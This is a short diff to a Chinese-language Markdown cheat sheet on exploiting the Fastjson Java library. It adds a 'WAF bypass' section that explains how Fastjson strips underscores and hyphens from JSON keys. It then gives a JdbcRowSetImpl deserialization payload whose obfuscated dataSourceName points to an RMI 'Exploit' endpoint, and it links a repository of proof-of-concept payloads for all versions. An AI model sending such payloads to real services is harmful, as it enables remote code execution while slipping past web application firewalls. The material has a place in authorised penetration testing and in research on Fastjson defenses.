@@ -51,6 +51,16 @@ mvn dependency:tree -Dincludes=com.alibaba:fastjson -Dverbose
 mvn dependency:tree -Dincludes=com.alibaba:fastjson
 ```
 
+
+### 绕WAF
+FastJson在解析JSON字段的key时，会将_和-替换为空；在1.2.36之前_和-只能单独使用，在1.2.36及之后，支持_和-混合使用。
+```
+{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
+```
+
+Ref:
+- https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md
+
 ## poc for all versions
 
 ### <= 1.2.68 org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig
